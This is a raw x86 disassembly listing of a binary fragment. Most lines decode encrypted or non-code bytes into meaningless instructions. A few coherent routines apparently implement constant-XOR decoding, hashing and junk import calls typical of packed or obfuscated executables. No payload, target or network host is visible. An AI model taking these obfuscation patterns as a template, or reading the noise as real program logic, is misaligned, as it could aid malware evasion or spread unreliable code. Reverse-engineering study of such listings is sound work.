  404a45:	and    al,0x43
  404a47:	jp     0x404a6d
  404a49:	int3   
  404a4a:	mov    ch,cl
  404a4c:	jbe    0x4049d9
  404a4e:	in     eax,0xc1
  404a50:	popf   
  404a51:	push   edi
  404a52:	cmp    BYTE PTR [eax-0x7a9f4e9d],cl
  404a58:	cwde   
  404a59:	dec    ecx
  404a5a:	mov    edx,ebp
  404a5c:	aad    0x6c
  404a5e:	scas   eax,DWORD PTR es:[edi]
  404a5f:	(bad)  
  404a60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a61:	pop    ds
  404a62:	in     al,dx
  404a63:	xor    dh,BYTE PTR [edx+0x1a]
  404a66:	out    dx,al
  404a67:	fmul   DWORD PTR [eax-0x41]
  404a6a:	sbb    eax,0x3dbea698
  404a6f:	enter  0x53e6,0x10
  404a73:	push   eax
  404a74:	sbb    ebp,DWORD PTR [esi]
  404a76:	rcl    ecx,0x83
  404a79:	daa    
  404a7a:	pushf  
  404a7b:	fs mov esi,0x4d73bcd
  404a81:	adc    eax,0xa8a75c10
  404a86:	outs   dx,DWORD PTR ds:[esi]
  404a87:	cmp    al,bl
  404a89:	sub    DWORD PTR [ebp+0x6b],ebx
  404a8c:	shl    BYTE PTR [edx-0x17df8c79],0x77
  404a93:	lods   eax,DWORD PTR ds:[esi]
  404a94:	mov    ebx,0xf838800d
  404a99:	inc    ebx
  404a9a:	or     eax,0xecda79b0
  404a9f:	push   ecx
  404aa0:	mov    ecx,0x7b0af2e
  404aa5:	int3   
  404aa6:	push   0x28
  404aa8:	sub    eax,0x3276adad
  404aad:	out    0xd7,eax
  404aaf:	retf   0xed2e
  404ab2:	ret    0x3a0
  404ab5:	xor    al,0xfa
  404ab7:	xchg   ecx,eax
  404ab8:	div    DWORD PTR [ebx+ebp*4+0x667b39ca]
  404abf:	ins    DWORD PTR es:[edi],dx
  404ac0:	push   edx
  404ac1:	out    dx,al
  404ac2:	mov    ebx,0xcfcf133e
  404ac7:	enter  0x4071,0xb6
  404acb:	jae    0x404aa7
  404acd:	inc    esp
  404ace:	test   DWORD PTR [ecx],edi
  404ad0:	pop    edx
  404ad1:	lahf   
  404ad2:	ficom  WORD PTR [ebp-0x15]
  404ad5:	adc    al,0x4e
  404ad7:	and    ebx,DWORD PTR [esi-0x7d]
  404ada:	mov    bh,0x51
  404adc:	in     eax,dx
  404add:	gs cmp cl,ah
  404ae0:	pushf  
  404ae1:	inc    ecx
  404ae2:	push   ebp
  404ae3:	jno    0x404b15
  404ae5:	xchg   esi,eax
  404ae6:	push   esp
  404ae7:	pop    es
  404ae8:	hlt    
  404ae9:	push   edi
  404aea:	dec    esp
  404aeb:	fcomip st,st(4)
  404aed:	ins    BYTE PTR es:[edi],dx
  404aee:	fnsave [edi+0x571507be]
  404af4:	inc    eax
  404af5:	call   DWORD PTR [edi+0x7]
  404af8:	and    BYTE PTR [edx],dh
  404afa:	clc    
  404afb:	call   0x57fc:0xad34f3b5
  404b02:	test   al,cl
  404b04:	retf   0x505c
  404b07:	sub    ecx,0xc6c5d8e4
  404b0d:	aaa    
  404b0e:	push   0xffffff8e
  404b10:	shr    BYTE PTR [ecx-0x38474043],cl
  404b16:	inc    esi
  404b17:	pop    ss
  404b18:	mov    edi,0x3e606a26
  404b1d:	loopne 0x404b35
  404b1f:	repnz cmp eax,DWORD PTR [eax+0x40a2cf45]
  404b26:	dec    eax
  404b27:	in     eax,0x38
  404b29:	xchg   edx,eax
  404b2a:	xchg   ebx,eax
  404b2b:	xchg   ebx,eax
  404b2c:	(bad)  
  404b2e:	cmp    ebp,DWORD PTR [edi]
  404b30:	(bad)  
  404b31:	mov    ebx,0x888d4066
  404b36:	shl    DWORD PTR [ebp+0x1ce90995],1
  404b3c:	rcl    DWORD PTR [ebx+0x60],0xb9
  404b40:	pop    ss
  404b41:	mov    DWORD PTR [ebx+ebp*2+0x74692b6],0x2bed60d3
  404b4c:	pusha  
  404b4d:	inc    esp
  404b4e:	out    0x80,al
  404b50:	repz repz mov bh,0xda
  404b54:	mov    dh,BYTE PTR [edi+0x8]
  404b57:	xor    BYTE PTR [edx-0x1dc780c1],bh
  404b5d:	lea    edi,[ecx]
  404b5f:	xor    eax,0x46931de0
  404b64:	lods   eax,DWORD PTR ds:[esi]
  404b65:	push   0x4931ea46
  404b6a:	dec    esi
  404b6b:	jno    0x404bdc
  404b6d:	dec    eax
  404b6e:	iret   
  404b6f:	sbb    edx,0xfffffffa
  404b72:	mov    dl,0x9e
  404b74:	cmp    BYTE PTR [edx-0x47],cl
  404b77:	inc    ebx
  404b78:	lock aad 0xeb
  404b7b:	lods   eax,DWORD PTR ds:[esi]
  404b7c:	inc    esi
  404b7d:	xchg   ebx,eax
  404b7e:	in     al,0xb2
  404b80:	fucomp st(7)
  404b82:	xor    ebp,0x66
  404b85:	push   ecx
  404b86:	mov    ebp,edi
  404b88:	mov    bh,0xb
  404b8a:	ins    BYTE PTR es:[edi],dx
  404b8b:	in     eax,dx
  404b8c:	pop    edx
  404b8d:	(bad)  
  404b8e:	push   0x3e
  404b90:	push   ss
  404b91:	cli    
  404b92:	mov    dh,0xaa
  404b94:	dec    ebx
  404b95:	dec    ebp
  404b96:	repnz sbb BYTE PTR [ebp-0x42],ch
  404b9a:	jp     0x404b55
  404b9c:	inc    ebp
  404b9d:	jl     0x404b8e
  404b9f:	xchg   esi,eax
  404ba0:	xor    eax,0xfcd3ac9d
  404ba5:	mov    al,ds:0xca1d8173
  404baa:	and    ebp,DWORD PTR [ebp+0x71]
  404bad:	ror    BYTE PTR [esi],0x56
  404bb0:	xchg   BYTE PTR [ecx+0x66754710],cl
  404bb6:	xchg   BYTE PTR [edi-0x23551f88],ch
  404bbc:	push   0xffffff96
  404bbe:	cli    
  404bbf:	pop    edx
  404bc0:	call   0xc887:0x10996b9b
  404bc7:	or     eax,esp
  404bc9:	idiv   BYTE PTR [ebp-0x382bed50]
  404bcf:	mov    esi,0x27a95433
  404bd4:	push   edi
  404bd5:	fnstsw WORD PTR [edx-0x2ee17698]
  404bdb:	mov    ebx,0xff8ed93b
  404be0:	cmp    al,BYTE PTR [ecx-0x2f83a43c]
  404be6:	xchg   edi,eax
  404be7:	push   ebx
  404be8:	fwait
  404be9:	and    BYTE PTR [edx+eiz*2],dl
  404bec:	pop    ss
  404bed:	clc    
  404bee:	test   DWORD PTR [edi-0x59b8111c],ebx
  404bf4:	aas    
  404bf5:	sub    eax,0xc387d66c
  404bfa:	es mov dh,0xae
  404bfd:	pusha  
  404bfe:	jne    0x404c6b
  404c00:	cmp    dh,bl
  404c02:	add    esp,DWORD PTR [eax-0x355fa75b]
  404c08:	mov    dh,0xd
  404c0a:	cs ret 
  404c0c:	sub    BYTE PTR [edi],dl
  404c0e:	mov    ds:0xa8141687,al
  404c13:	sub    eax,0x5985227b
  404c18:	fistp  DWORD PTR [esi+0x7]
  404c1b:	dec    ebp
  404c1c:	fwait
  404c1d:	jle    0x404c89
  404c1f:	arpl   WORD PTR [edx],ax
  404c21:	pop    ds
  404c22:	sub    al,0x1c
  404c24:	dec    edi
  404c25:	push   ebp
  404c26:	in     eax,0xd0
  404c28:	repz dec BYTE PTR [ecx+edi*1]
  404c2c:	imul   ch
  404c2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c2f:	mov    ecx,0x724e336
  404c34:	dec    ebx
  404c35:	aaa    
  404c36:	add    al,0xf3
  404c39:	gs sbb eax,0xfd176760
  404c3f:	adc    eax,0x38244b73
  404c44:	cmpps  xmm3,XMMWORD PTR [edx],0xf0
  404c48:	and    eax,0x1445ea8f
  404c4d:	mov    edi,0x24f420f1
  404c52:	sub    eax,0xed3b16a9
  404c57:	or     ch,BYTE PTR [edi]
  404c59:	stc    
  404c5a:	xchg   ebx,eax
  404c5b:	adc    edi,DWORD PTR [ebp+0x60d97a5]
  404c61:	pop    ecx
  404c62:	mov    al,ds:0x2cca3974
  404c67:	add    dh,al
  404c69:	or     al,BYTE PTR ds:0x7b295845
  404c6f:	inc    edx
  404c70:	scas   al,BYTE PTR es:[edi]
  404c71:	aas    
  404c72:	in     al,0xfd
  404c74:	cld    
  404c75:	out    dx,al
  404c76:	lock jmp 0x404c1a
  404c79:	cld    
  404c7a:	pop    eax
  404c7b:	mov    al,ds:0x8cb49341
  404c80:	xchg   ebp,eax
  404c81:	cmp    BYTE PTR [esi*4+0x76c37843],0x3e
  404c89:	icebp  
  404c8a:	rcr    BYTE PTR [edi],1
  404c8c:	adc    al,0x4f
  404c8e:	xchg   edi,eax
  404c8f:	call   DWORD PTR [edi]
  404c91:	mov    ch,0x31
  404c93:	xchg   ebp,eax
  404c94:	(bad)  
  404c96:	fsubrp st(4),st
  404c98:	push   ecx
  404c99:	jecxz  0x404cc4
  404c9b:	cmp    DWORD PTR [edx-0x3c95e984],esp
  404ca1:	mov    esp,0xa8a0df2f
  404ca6:	inc    ebx
  404ca7:	mov    cl,0x42
  404ca9:	cdq    
  404caa:	pop    eax
  404cab:	dec    ebp
  404cac:	push   ds
  404cad:	mov    dl,0x54
  404caf:	cld    
  404cb0:	pop    edx
  404cb1:	push   es
  404cb2:	adc    eax,0x80dff1d3
  404cb7:	or     edi,DWORD PTR ss:[eax+edi*4-0x4a]
  404cbc:	and    ebp,ebp
  404cbe:	push   esi
  404cbf:	cmp    ecx,esi
  404cc1:	sub    esp,eax
  404cc3:	jo     0x404cfc
  404cc5:	add    bh,ah
  404cc7:	out    0xd7,eax
  404cc9:	push   ebp
  404cca:	push   esi
  404ccb:	stos   DWORD PTR es:[edi],eax
  404ccc:	je     0x404ce8
  404cce:	aad    0xe9
  404cd0:	and    ebx,DWORD PTR [eax]
  404cd2:	hlt    
  404cd3:	es lahf 
  404cd5:	mov    edx,0x6c7f9ec5
  404cda:	pop    esp
  404cdb:	mov    ?,WORD PTR [eax+0x6b]
  404cde:	and    DWORD PTR [ebp+0x7e],0xffffffce
  404ce2:	mov    dh,0x4f
  404ce4:	mov    BYTE PTR [edi-0x53],dl
  404ce7:	cmp    DWORD PTR [eax-0x434bbab3],esi
  404ced:	xor    bl,bl
  404cef:	scas   al,BYTE PTR es:[edi]
  404cf0:	xlat   BYTE PTR ds:[ebx]
  404cf1:	mov    DWORD PTR [edx-0x27dbc6],esi
  404cf7:	ja     0x404d61
  404cf9:	inc    edi
  404cfa:	and    al,0xed
  404cfc:	cmp    cl,BYTE PTR [ebx+0x81ec45]
  404d02:	mov    edx,?
  404d04:	add    eax,0xf0458b07
  404d09:	mov    edx,DWORD PTR [ebp+0x8]
  404d0c:	xor    eax,ecx
  404d0e:	lea    eax,[eax+edx*1+0x327299]
  404d15:	mov    DWORD PTR [ebp+0x8],eax
  404d18:	inc    DWORD PTR [ebp+0xc]
  404d1b:	jmp    0x4040d8
  404d20:	mov    eax,DWORD PTR [ebp-0x10]
  404d23:	xor    eax,ecx
  404d25:	mov    ecx,DWORD PTR [ebp+0x10]
  404d28:	add    eax,esi
  404d2a:	mov    DWORD PTR [ecx],eax
  404d2c:	pop    esi
  404d2d:	leave  
  404d2e:	ret    0xc
  404d31:	push   ebp
  404d32:	mov    ebp,esp
  404d34:	push   ecx
  404d35:	sub    edx,eax
  404d37:	jmp    0x404f34
  404d3c:	pop    edi
  404d3d:	mov    ebx,cs
  404d3f:	and    ebp,edi
  404d41:	jno    0x404dc0
  404d43:	dec    esp
  404d44:	call   0xc2aa7d7b
  404d49:	ins    BYTE PTR es:[edi],dx
  404d4a:	dec    eax
  404d4b:	push   esp
  404d4c:	sbb    ebp,DWORD PTR [edi]
  404d4e:	jle    0x404dce
  404d50:	pop    esi
  404d51:	jg     0x404dd1
  404d53:	jle    0x404d75
  404d55:	into   
  404d56:	dec    edx
  404d57:	retf   0x90dd
  404d5a:	aaa    
  404d5b:	and    ch,BYTE PTR [ecx-0xf]
  404d5e:	outs   dx,DWORD PTR ds:[esi]
  404d5f:	dec    edi
  404d60:	add    ebp,DWORD PTR [eax]
  404d62:	nop
  404d63:	mov    eax,ds:0x7cf3c46b
  404d68:	fstp   QWORD PTR [eax+0x40]
  404d6b:	call   0x513cab05
  404d70:	xchg   ecx,eax
  404d71:	aam    0xc9
  404d73:	loop   0x404dc9
  404d75:	adc    al,0xf9
  404d77:	jae    0x404da1
  404d79:	dec    edx
  404d7a:	jne    0x404dcf
  404d7c:	lock into 
  404d7e:	pop    edx
  404d7f:	pop    ebp
  404d80:	fcomp  DWORD PTR [edx]
  404d82:	ins    DWORD PTR es:[edi],dx
  404d83:	out    dx,eax
  404d84:	and    DWORD PTR [ebx+0x39],eax
  404d87:	(bad)  
  404d88:	aas    
  404d89:	pop    esi
  404d8a:	pop    ds
  404d8b:	aas    
  404d8c:	(bad)  
  404d8d:	mov    es,ebx
  404d8f:	pop    eax
  404d90:	cmc    
  404d91:	mov    fs,WORD PTR ds:0x2f058419
  404d97:	into   
  404d98:	scas   al,BYTE PTR es:[edi]
  404d99:	xchg   esi,edx
  404d9b:	cmp    dl,BYTE PTR [esi+edi*2]
  404d9e:	or     dl,cl
  404da0:	shr    DWORD PTR [eax+0x2fcb5c54],cl
  404da6:	aam    0x32
  404da8:	(bad)  
  404da9:	push   ss
  404daa:	sub    eax,0x4c2d0916
  404daf:	lods   al,BYTE PTR ds:[esi]
  404db0:	aad    0xb
  404db2:	rol    edx,0x33
  404db5:	(bad)  [ecx]
  404db7:	icebp  
  404db8:	cmp    esi,DWORD PTR [edi+edx*8+0x12]
  404dbc:	repz dec ecx
  404dbe:	jmp    0x404db9
  404dc0:	stos   BYTE PTR es:[edi],al
  404dc1:	into   
  404dc2:	inc    ebx
  404dc3:	xchg   esi,eax
  404dc4:	(bad)  
  404dc5:	mov    eax,ds:0xcdc3def7
  404dca:	cmp    DWORD PTR [edx+0x654236a2],ebx
  404dd0:	mov    ds:0x1878bb5c,al
  404dd5:	std    
  404dd6:	cs fwait
  404dd8:	mov    gs,WORD PTR [ecx]
  404dda:	fistp  WORD PTR [ebx-0x19c0edb6]
  404de0:	repz or ch,BYTE PTR cs:[edx-0x1c]
  404de5:	mov    dl,al
  404de7:	xchg   ebx,eax
  404de8:	sub    al,BYTE PTR [edx+0x4a]
  404deb:	bnd jp 0x404dc9
  404dee:	sbb    dl,ch
  404df0:	outs   dx,BYTE PTR ds:[esi]
  404df1:	arpl   ax,cx
  404df3:	jge    0x404dba
  404df5:	sub    edi,ebx
  404df7:	jg     0x404dd2
  404df9:	push   edi
  404dfa:	jmp    0xfd10d7e9
  404dff:	test   bh,0x6c
  404e02:	sbb    esp,ebx
  404e04:	and    BYTE PTR ds:0xd94a06df,bh
  404e0a:	test   BYTE PTR [edx+0x6c8145c6],dl
  404e10:	test   al,0xe1
  404e12:	or     eax,0x4a82597e
  404e17:	stos   DWORD PTR es:[edi],eax
  404e18:	or     eax,0xffe908e0
  404e1d:	mov    ecx,0x4996f403
  404e22:	loope  0x404e49
  404e24:	push   edx
  404e25:	mov    WORD PTR [ecx-0x63],?
  404e28:	jae    0x404e4b
  404e2a:	mov    eax,0x8cefc952
  404e2f:	fwait
  404e30:	jnp    0x404e66
  404e32:	push   ecx
  404e33:	adc    eax,0xb95dd483
  404e38:	push   esi
  404e39:	sahf   
  404e3a:	cmp    BYTE PTR [ebx-0x6110aab0],dl
  404e40:	xchg   esi,eax
  404e41:	daa    
  404e42:	push   ecx
  404e43:	mov    bh,0xaa
  404e45:	cmp    DWORD PTR [edi],ebp
  404e47:	in     al,0x1a
  404e49:	idiv   esp
  404e4b:	jae    0x404ea5
  404e4d:	loop   0x404e99
  404e4f:	mov    dl,0x27
  404e51:	and    ah,BYTE PTR [edx-0x49111020]
  404e57:	push   0xffffffa9
  404e59:	dec    eax
  404e5a:	cwde   
  404e5b:	(bad)  
  404e5c:	repnz pop edx
  404e5e:	or     BYTE PTR [eax+0x743f37c0],cl
  404e64:	jecxz  0x404eb9
  404e66:	or     DWORD PTR [esi],ecx
  404e68:	stos   BYTE PTR es:[edi],al
  404e69:	test   eax,0x671a7848
  404e6e:	cmp    al,0x8e
  404e70:	and    BYTE PTR [eax+ecx*1-0x79],cl
  404e74:	sbb    eax,0xc32b0a7
  404e79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e7a:	(bad)  
  404e7b:	jmp    0x8dd58588
  404e80:	(bad)  
  404e81:	xor    BYTE PTR [eax],bh
  404e83:	jns    0x404ebb
  404e85:	aas    
  404e86:	and    al,0xda
  404e88:	les    ebp,FWORD PTR [ebx+0x405fbb1a]
  404e8e:	aad    0xa5
  404e90:	sub    edi,DWORD PTR [esi-0x3e]
  404e93:	test   eax,0xd7519055
  404e98:	scas   al,BYTE PTR es:[edi]
  404e99:	(bad)  
  404e9a:	inc    esi
  404e9b:	add    BYTE PTR [ebx+0x25],ah
  404e9e:	sub    eax,0xd875dd56
  404ea3:	in     al,0x44
  404ea5:	push   cs
  404ea6:	jmp    0xb92a:0x86de1797
  404ead:	cmp    al,BYTE PTR [esi]
  404eaf:	test   BYTE PTR [edx],cl
  404eb1:	or     WORD PTR es:[edx+0x30],ax
  404eb6:	cwde   
  404eb7:	inc    edx
  404eb8:	std    
  404eb9:	repz sbb DWORD PTR [edi],0xffffffe2
  404ebd:	mov    ecx,0xc8dacfbb
  404ec2:	lock gs es mov ah,0x87
  404ec7:	and    esp,eax
  404ec9:	ret    0x5444
  404ecc:	inc    eax
  404ecd:	lea    ebp,[eax+0x4d]
  404ed0:	aam    0xcf
  404ed2:	mov    esp,0xce72b127
  404ed7:	out    dx,al
  404ed8:	mov    al,ds:0x8a6bdf46
  404edd:	jne    0x404f4a
  404edf:	xor    eax,0x14dd2052
  404ee4:	push   edx
  404ee5:	cmp    DWORD PTR [ebx+0x43a4b759],esi
  404eeb:	xchg   ebp,eax
  404eec:	jo     0x404ed8
  404eee:	(bad)  
  404ef0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ef1:	xchg   edx,eax
  404ef2:	bound  ebx,QWORD PTR [eax+0x6cedc311]
  404ef8:	loope  0x404f79
  404efa:	adc    esi,edx
  404efc:	les    esi,FWORD PTR ds:0xcb72f153
  404f02:	jge    0x404e92
  404f04:	stc    
  404f05:	mov    dl,0x8b
  404f07:	add    eax,0x3176833c
  404f0c:	fistp  DWORD PTR [ebx]
  404f0e:	or     BYTE PTR [ecx-0x66],dh
  404f11:	xchg   DWORD PTR [ebp+edx*4-0x4e],edi
  404f15:	adc    edx,edx
  404f17:	xlat   BYTE PTR ds:[ebx]
  404f18:	(bad)  
  404f19:	mov    ds:0xb00befa1,al
  404f1e:	adc    DWORD PTR [ebx+edx*4-0x20],ebx
  404f22:	dec    ebp
  404f23:	mov    eax,ds:0xc5b4a2c6
  404f28:	or     DWORD PTR [esi-0x5f56ff9b],edi
  404f2e:	aam    0x58
  404f30:	or     esi,DWORD PTR [ebx-0x56]
  404f33:	sub    al,0x51
  404f35:	or     edx,DWORD PTR ds:0x4345fb
  404f3b:	mov    DWORD PTR [ebp-0x8],0xf89c8536
  404f42:	mov    DWORD PTR ds:0x43468b,0x1c
  404f4c:	cmp    DWORD PTR ds:0x43468b,0x0
  404f53:	je     0x404f94
  404f59:	cmp    DWORD PTR ds:0x43468b,0x21
  404f60:	jne    0x404f84
  404f66:	push   DWORD PTR [ebp-0x24]
  404f69:	push   DWORD PTR [ebp-0x20]
  404f6c:	push   0x26f9
  404f71:	push   0x3d74
  404f76:	push   0x4b4e
  404f7b:	push   DWORD PTR [ebp-0x1c]
  404f7e:	call   DWORD PTR ds:0x413280
  404f84:	mov    eax,ds:0x43468b
  404f89:	dec    eax
  404f8a:	mov    ds:0x43468b,eax
  404f8f:	jmp    0x404f4c
  404f94:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  404f9b:	mov    eax,DWORD PTR [ebp-0x4]
  404f9e:	xor    DWORD PTR ds:0x4345f3,ecx
  404fa4:	push   esi
  404fa5:	and    DWORD PTR ds:0x434693,0x0
  404faf:	mov    edx,DWORD PTR ds:0x434693
  404fb5:	inc    edx
  404fb6:	mov    DWORD PTR ds:0x434693,edx
  404fbc:	cmp    DWORD PTR ds:0x434693,0x21
  404fc3:	jne    0x404fe1
  404fc9:	push   0x434849
  404fce:	push   0x4347ce
  404fd3:	push   0x6321
  404fd8:	push   DWORD PTR [ebp-0x10]
  404fdb:	call   DWORD PTR ds:0x4130bc
  404fe1:	cmp    DWORD PTR ds:0x434693,0x19
  404fe8:	jb     0x404faf
  404fee:	inc    ecx
  404fef:	mov    esi,DWORD PTR [ebp-0x8]
  404ff2:	inc    DWORD PTR ds:0x434637
  404ff8:	mov    edx,0x7510851
  404ffd:	xor    eax,edx
  404fff:	xor    esi,edx
  405001:	mov    ecx,0x327299
  405006:	add    esi,ecx
  405008:	xor    DWORD PTR ds:0x434637,0x55d1
  405012:	add    eax,ecx
  405014:	imul   eax,esi
  405017:	mov    esi,DWORD PTR [ebp+0xc]
  40501a:	cmp    esi,eax
  40501c:	jne    0x405038
  405022:	mov    eax,DWORD PTR [ebp-0x4]
  405025:	mov    esi,DWORD PTR [ebp-0x8]
  405028:	xor    eax,edx
  40502a:	xor    esi,edx
  40502c:	add    eax,ecx
  40502e:	add    esi,ecx
  405030:	imul   eax,esi
  405033:	jmp    0x405270
  405038:	mov    eax,DWORD PTR [ebp+0xc]
  40503b:	mov    eax,DWORD PTR [eax+0x78]
  40503e:	jmp    0x40523b
  405043:	imul   esp,DWORD PTR [eax],0x7d571dbe
  405049:	jge    0x4050b7
  40504b:	push   esp
  40504c:	pop    ds
  40504d:	loopne 0x40508f
  40504f:	arpl   si,cx
  405051:	ds cwde 
  405053:	jnp    0x40507e
  405055:	jle    0x4050d5
  405057:	pop    esi
  405058:	jg     0x4050d8
  40505a:	jle    0x404fe3
  40505c:	ja     0x4050dc
  40505e:	in     al,0xf9
  405060:	bound  ecx,QWORD PTR [eax+0x1d2d70]
  405066:	out    dx,eax
  405067:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405068:	xchg   edx,eax
  405069:	int3   
  40506a:	pop    edx
  40506b:	test   DWORD PTR [esi-0x4d314361],0x3ddbbb66
  405075:	mov    edx,0xba648298
  40507a:	mov    ebp,0x744ea0f9
  40507f:	in     al,dx
  405080:	cmp    eax,DWORD PTR [ebx-0x7f1e1bc8]
  405086:	call   0x5f6df544
  40508b:	and    BYTE PTR [ebx],0x9c
  40508e:	out    0x81,eax
  405090:	adc    BYTE PTR [esi+0x5f4dcb8e],bh
  405096:	xchg   ebp,eax
  405097:	in     al,dx
  405098:	bound  edx,QWORD PTR [edi+0x73]
  40509b:	sub    DWORD PTR [ebp-0x1e],esi
  40509e:	sbb    BYTE PTR [ebx-0x1f],cl
  4050a1:	xlat   BYTE PTR ds:[ebx]
  4050a2:	es rcr edx,1
  4050a5:	inc    eax
  4050a6:	xchg   edi,eax
  4050a7:	mov    esi,0x48bea81a
  4050ac:	stos   DWORD PTR es:[edi],eax
  4050ad:	jmp    0xd0:0xf465214e
  4050b4:	mov    ebp,0x725f7f2a
  4050b9:	dec    edx
  4050ba:	cmc    
  4050bb:	sub    BYTE PTR [edx],ah
  4050bd:	xchg   ebx,eax
  4050be:	ds dec ebx
  4050c0:	cmp    cl,BYTE PTR [edx]
  4050c2:	inc    esp
  4050c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050c4:	sbb    eax,0x8d8e9ce7
  4050c9:	sub    BYTE PTR [ecx+0x26],cl
  4050cc:	jne    0x4050cc
  4050ce:	enter  0x54c8,0x7a
  4050d2:	xlat   BYTE PTR ds:[ebx]
  4050d3:	and    dl,BYTE PTR [edi]
  4050d5:	ret    
  4050d6:	repnz xchg edi,eax
  4050d8:	stos   BYTE PTR es:[edi],al
  4050d9:	mov    ds:0x7be2805c,al
  4050de:	add    BYTE PTR [ecx+ebp*8+0x4b],cl
  4050e2:	xchg   esp,eax
  4050e3:	pop    ebx
  4050e4:	pop    eax
  4050e5:	add    cl,ah
  4050e7:	es out 0x96,eax
  4050ea:	inc    esi
  4050eb:	repnz sub eax,0x6543529a
  4050f1:	or     ebp,DWORD PTR [ebx]
  4050f3:	push   ecx
  4050f4:	xor    al,0x98
  4050f6:	sub    al,0xf3
  4050f8:	add    al,0x1a
  4050fa:	dec    edi
  4050fb:	xor    DWORD PTR [edx],edi
  4050fd:	sbb    eax,0xaab2bb3b
  405102:	jl     0x4050e3
  405104:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405105:	sub    eax,0x74d07d3b
  40510a:	loope  0x405175
  40510c:	xchg   BYTE PTR ds:0xf90577e,dl
  405112:	addr16 jo 0x40510b
  405115:	mov    ch,0x94
  405117:	add    DWORD PTR ds:0x81631380,esi
  40511d:	je     0x405129
  40511f:	clc    
  405120:	pop    esp
  405121:	push   ds
  405122:	cmp    dl,cl
  405124:	inc    esp
  405125:	push   ebp
  405126:	stos   DWORD PTR es:[edi],eax
  405127:	inc    eax
  405128:	cmp    al,0xd8
  40512a:	sbb    ebx,edx
  40512c:	call   0xdd8d:0x469c5f3
  405133:	pop    esi
  405134:	sub    eax,0xa62980d9
  405139:	cs out dx,eax
  40513b:	jmp    0xc753:0x41dccdea
  405142:	retf   
  405143:	cmc    
  405144:	jle    0x4050f3
  405146:	or     al,0xea
  405148:	outs   dx,BYTE PTR ds:[esi]
  405149:	stos   BYTE PTR es:[edi],al
  40514a:	ror    DWORD PTR [ebx+0x2ef50e39],1
  405150:	into   
  405151:	addr16 test eax,0x583f9e76
  405157:	rcl    DWORD PTR [ecx-0x7841764b],cl
  40515d:	xor    edi,DWORD PTR es:[eax+ebx*1]
  405161:	popa   
  405162:	mov    ah,0x32
  405164:	mov    eax,ds:0xb9142d25
  405169:	and    al,0x40
  40516b:	int3   
  40516c:	cmp    eax,0xe4251441
  405171:	push   cs
  405172:	mov    ch,0x7f
  405174:	sbb    esi,DWORD PTR [eax+0x1c235321]
  40517a:	stc    
  40517b:	lea    ecx,[edi+0x1279bbd1]
  405181:	mov    dl,0xff
  405183:	adc    DWORD PTR [esi],edx
  405185:	lods   al,BYTE PTR ds:[esi]
  405186:	cdq    
  405187:	jg     0x405113
  405189:	push   esi
  40518a:	fwait
  40518b:	xlat   BYTE PTR ds:[ebx]
  40518c:	jge    0x4051e9
  40518e:	sub    ecx,ebx
  405190:	xor    DWORD PTR gs:[edi+0x403467cd],ebp
  405197:	mov    ah,BYTE PTR [ebx+ebp*8+0x29aeecd4]
  40519e:	push   es
  40519f:	lock ror BYTE PTR [eax+0x43],1
  4051a3:	adc    edi,DWORD PTR [ebp-0x22]
  4051a6:	jbe    0x40518e
  4051a8:	mov    edi,0xa445a9e5
  4051ad:	mov    ebx,0xe67380b0
  4051b2:	loopne 0x4051cf
  4051b4:	jmp    0x1b3:0x4d3973ed
  4051bb:	sbb    eax,0xbb365096
  4051c0:	and    BYTE PTR ss:[edi-0x7d],ah
  4051c4:	push   edi
  4051c5:	idiv   cl
  4051c7:	add    esi,DWORD PTR [esi-0x4e]
  4051ca:	in     eax,dx
  4051cb:	push   ss
  4051cc:	sub    DWORD PTR ds:0x7a185971,edx
  4051d2:	sbb    al,0x9f
  4051d4:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4051d6:	or     DWORD PTR [edx+ebx*4],esp
  4051d9:	int3   
  4051da:	and    DWORD PTR [eax],esp
  4051dc:	dec    eax
  4051dd:	mov    ds:0xd33c844b,eax
  4051e2:	data16 mov al,ds:0x7aa08bb6
  4051e8:	dec    ebx
  4051e9:	pusha  
  4051ea:	out    dx,eax
  4051eb:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4051ed:	aam    0x90
  4051ef:	sbb    al,0x59
  4051f1:	sar    BYTE PTR [ecx],0x91
  4051f4:	mov    eax,0x43a12816
  4051f9:	ret    
  4051fa:	sub    BYTE PTR [eax+0x6b],cl
  4051fd:	xor    BYTE PTR [ecx-0x3d],0x5c
  405201:	adc    esp,esi
  405203:	or     BYTE PTR [ebp-0x1a442eeb],ah
  405209:	jmp    0x4051dc
  40520b:	jns    0x405228
  40520d:	jg     0x4051dc
  40520f:	and    bh,BYTE PTR [ebx]
  405211:	xlat   BYTE PTR ds:[ebx]
  405212:	jmp    0x8de7:0xad121930
  405219:	pop    ebx
  40521a:	pop    ds
  40521b:	dec    esp
  40521c:	push   0x3f
  40521e:	sbb    dh,BYTE PTR [ebx+0x7e]
  405221:	mov    edi,DWORD PTR ds:0xc04cb174
  405227:	jle    0x40520b
  405229:	(bad)  
  40522b:	adc    DWORD PTR [esi-0x47],ebx
  40522e:	cmp    DWORD PTR [eax],esp
  405230:	test   DWORD PTR [edx],ecx
  405232:	cmp    DWORD PTR [ebp-0x21],edi
  405235:	(bad)  
  405236:	xlat   BYTE PTR ds:[ebx]
  405237:	or     al,BYTE PTR [ebx-0x14]
  40523a:	mov    DWORD PTR fs:[ebp+0xc],eax
  40523e:	mov    eax,DWORD PTR [ebp-0x4]
  405241:	mov    esi,DWORD PTR [ebp-0x8]
  405244:	xor    eax,edx
  405246:	xor    esi,edx
  405248:	add    eax,ecx
  40524a:	add    esi,ecx
  40524c:	imul   eax,esi
  40524f:	mov    esi,DWORD PTR [ebp+0xc]
  405252:	cmp    esi,eax
  405254:	mov    eax,DWORD PTR [ebp-0x4]
  405257:	je     0x405025
  40525d:	xor    eax,edx
  40525f:	add    eax,ecx
  405261:	mov    ecx,DWORD PTR [ebp+0xc]
  405264:	imul   eax,ecx
  405267:	add    eax,DWORD PTR [ebp+0x8]
  40526a:	mov    DWORD PTR [ebp+0xc],eax
  40526d:	mov    eax,DWORD PTR [ebp+0xc]
  405270:	pop    esi
  405271:	leave  
  405272:	ret    0x8
  405275:	push   ebp
